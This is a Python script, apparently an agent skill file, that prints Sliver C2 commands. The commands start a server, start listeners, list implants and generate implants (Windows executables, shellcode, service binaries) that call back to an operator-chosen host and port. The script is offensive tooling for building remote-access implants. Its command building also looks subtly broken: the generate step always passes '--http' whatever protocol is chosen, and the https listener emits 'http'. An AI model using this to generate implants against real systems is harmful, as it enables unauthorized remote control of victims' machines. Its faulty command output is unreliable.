#!/usr/bin/env python3
"""Generate Sliver server/client workflow commands for common C2 tasks.

Usage:
  python skills/c2/scripts/sliver_setup.py --action generate --lhost 10.0.0.5 --lport 8443 --protocol https --os windows --arch amd64 --format exe -o implant.exe
"""

from __future__ import annotations

import argparse
import json


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Sliver setup helper.")
    parser.add_argument(
        "--action",
        choices=["server", "generate", "listener", "implant-list"],
        required=True,
    )
    parser.add_argument("--lhost")
    parser.add_argument("--lport", type=int)
    parser.add_argument(
        "--protocol", choices=["mtls", "https", "dns", "wg"], default="https"
    )
    parser.add_argument(
        "--os", choices=["windows", "linux", "macos"], default="windows"
    )
    parser.add_argument("--arch", choices=["amd64", "386", "arm64"], default="amd64")
    parser.add_argument(
        "--format", choices=["exe", "shellcode", "shared", "service"], default="exe"
    )
    parser.add_argument("-o", "--output")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    commands: list[str] = []

    if args.action == "server":
        commands.append("sliver-server")
    elif args.action == "generate":
        c2 = (
            f"{args.protocol}://{args.lhost}:{args.lport}"
            if args.lhost and args.lport
            else f"{args.protocol}://<lhost>:<lport>"
        )
        gen = f"generate --{args.os} --arch {args.arch} --format {args.format} --http {c2}"
        if args.output:
            gen += f" --save {args.output}"
        commands.append(gen)
    elif args.action == "listener":
        bind = (
            f"{args.lhost}:{args.lport}"
            if args.lhost and args.lport
            else "<lhost>:<lport>"
        )
        commands.append(
            f"http --lhost {bind.split(':')[0]} --lport {bind.split(':')[1]}"
            if args.protocol == "https"
            else f"{args.protocol} --lhost {bind.split(':')[0]} --lport {bind.split(':')[1]}"
        )
    else:
        commands.append("implants")

    payload = {
        "action": args.action,
        "commands": {
            "server_start": "sliver-server",
            "client": "sliver",
            "action_commands": commands,
        },
    }

    for cmd in commands:
        print(cmd)
    print(json.dumps(payload, indent=2, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
